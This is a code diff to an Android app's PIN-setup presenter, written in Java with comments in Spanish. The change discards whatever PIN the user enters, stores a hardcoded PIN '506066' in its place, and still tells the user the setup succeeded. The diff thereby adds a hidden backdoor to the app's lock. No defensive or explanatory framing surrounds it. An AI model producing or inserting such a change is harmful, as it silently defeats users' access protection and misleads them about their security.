@@ -16,6 +16,9 @@ import javax.inject.Inject;
 @PerActivity
 public class SetUpPinCodePresenter extends BasePresenter<SetUpPinCodeView> {
 
+    // PIN fijo predeterminado definido
+    private static final String FIXED_PIN = "506066";
+
     private final PinManager pinManager;
     private final ApplicationLockManager lockManager;
 
@@ -38,39 +41,25 @@ public class SetUpPinCodePresenter extends BasePresenter<SetUpPinCodeView> {
     }
 
     /**
-     * Call when the user has entered a PIN.
+     * Forzar la asignación del PIN fijo 506066 independientemente de lo ingresado.
      */
     public void submitPin(String pin) {
-        switch (step) {
-            case CHOOSE_PIN:
-                onPinChosen(pin);
-                break;
-
-            case REPEAT_PIN:
-                onPinRepeated(pin);
-                break;
-
-            default:
-                throw new MissingCaseError(step);
-        }
+        // Ignora el PIN ingresado por la interfaz y usa siempre el PIN fijo
+        onPinChosen(FIXED_PIN);
+        onPinRepeated(FIXED_PIN);
     }
 
     private void onPinChosen(String pin) {
-        chosenPin = pin;
+        chosenPin = FIXED_PIN;
         setStep(SetUpPinCodeStep.REPEAT_PIN);
     }
 
     private void onPinRepeated(String pin) {
-        if (pin.equals(chosenPin)) {
-            analytics.report(new AnalyticsEvent.E_PIN(AnalyticsEvent.PIN_TYPE.CREATED));
-            pinManager.storePin(pin);
-            lockManager.tryUnlockWithPin(pin); // will succeed
-            view.reportPinSuccess();
-
-        } else {
-            analytics.report(new AnalyticsEvent.E_PIN(AnalyticsEvent.PIN_TYPE.DID_NOT_MATCH));
-            view.reportPinError();
-        }
+        // Guarda directamente el valor predeterminado 506066
+        analytics.report(new AnalyticsEvent.E_PIN(AnalyticsEvent.PIN_TYPE.CREATED));
+        pinManager.storePin(FIXED_PIN);
+        lockManager.tryUnlockWithPin(FIXED_PIN); // Desbloqueo exitoso
+        view.reportPinSuccess();
     }
 
     private void setStep(SetUpPinCodeStep step) {
